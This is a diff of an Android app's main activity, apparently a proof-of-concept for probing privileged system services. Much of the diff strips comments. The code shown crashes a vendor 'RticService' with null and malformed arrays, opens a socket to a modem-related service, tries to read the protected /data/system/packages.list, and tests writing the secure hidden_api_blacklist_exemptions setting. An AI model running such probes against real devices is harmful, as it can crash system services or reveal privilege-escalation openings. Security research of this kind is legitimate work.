@@ -210,11 +210,10 @@ public class MainActivity extends AppCompatActivity {
 
     private void crashRtic(IRticService rtic) {
         appendLog("--- Causing RticService crashes ---");
-        // 空の配列で呼び出し -> ArrayIndexOutOfBoundsException
         int[][] emptyArrays = {
             new int[0],
             new int[0],
-            null // null might cause NPE
+            null
         };
         for (int i = 0; i < emptyArrays.length; i++) {
             try {
@@ -230,7 +229,6 @@ public class MainActivity extends AppCompatActivity {
             }
             try { Thread.sleep(100); } catch (Exception ignored) {}
         }
-        // 巨大なタイムスタンプでも試す
         try {
             int[] status = new int[1];
             int[] ret = new int[1];
@@ -259,7 +257,6 @@ public class MainActivity extends AppCompatActivity {
         } catch (Exception e) {
             appendLog("  getTrustedLocation with null crash: " + e.getMessage());
         }
-        // 異常な配列長
         try {
             int[] status = new int[2];
             int[] ret = new int[2];
@@ -315,7 +312,6 @@ public class MainActivity extends AppCompatActivity {
             appendLog("Connected to ssgqmig!");
             OutputStream os = socket.getOutputStream();
             InputStream is = socket.getInputStream();
-            // Send some simple QMI-like data? Not sure, just test connectivity.
             os.write("HELLO".getBytes(StandardCharsets.UTF_8));
             os.flush();
             byte[] buf = new byte[1024];
@@ -335,7 +331,6 @@ public class MainActivity extends AppCompatActivity {
             appendLog("Cannot create Download dir");
             return;
         }
-        // Write test
         try {
             File testFile = new File(downloadDir, "poc_write_test.txt");
             try (FileOutputStream fos = new FileOutputStream(testFile)) {
@@ -345,7 +340,6 @@ public class MainActivity extends AppCompatActivity {
         } catch (Exception e) {
             appendLog("Write failed: " + e.getMessage());
         }
-        // Read test (try to read /proc/version which is world-readable)
         try {
             File procVersion = new File("/proc/version");
             if (procVersion.exists() && procVersion.canRead()) {
@@ -363,7 +357,6 @@ public class MainActivity extends AppCompatActivity {
         } catch (Exception e) {
             appendLog("Read /proc/version failed: " + e.getMessage());
         }
-        // Try to read /data/system/packages.list (should be permission denied)
         try {
             File packagesList = new File("/data/system/packages.list");
             if (packagesList.exists()) {
@@ -386,14 +379,12 @@ public class MainActivity extends AppCompatActivity {
     private void testSettingsWrite() {
         appendLog("--- Testing Settings write (WRITE_SECURE_SETTINGS) ---");
         try {
-            String current = Settings.Global.getString(getContentResolver(), Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS);
+            String current = Settings.Global.getString(getContentResolver(), "hidden_api_blacklist_exemptions");
             appendLog("Current hidden_api_blacklist_exemptions: " + current);
-            // Try to write a test value (requires WRITE_SECURE_SETTINGS)
-            boolean success = Settings.Global.putString(getContentResolver(), Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS, "test_value");
+            boolean success = Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", "test_value");
             if (success) {
                 appendLog("WRITE_SECURE_SETTINGS succeeded! We can modify system settings.");
-                // Clean up
-                Settings.Global.putString(getContentResolver(), Settings.Global.HIDDEN_API_BLACKLIST_EXEMPTIONS, current);
+                Settings.Global.putString(getContentResolver(), "hidden_api_blacklist_exemptions", current);
             } else {
                 appendLog("WRITE_SECURE_SETTINGS failed (permission denied)");
             }
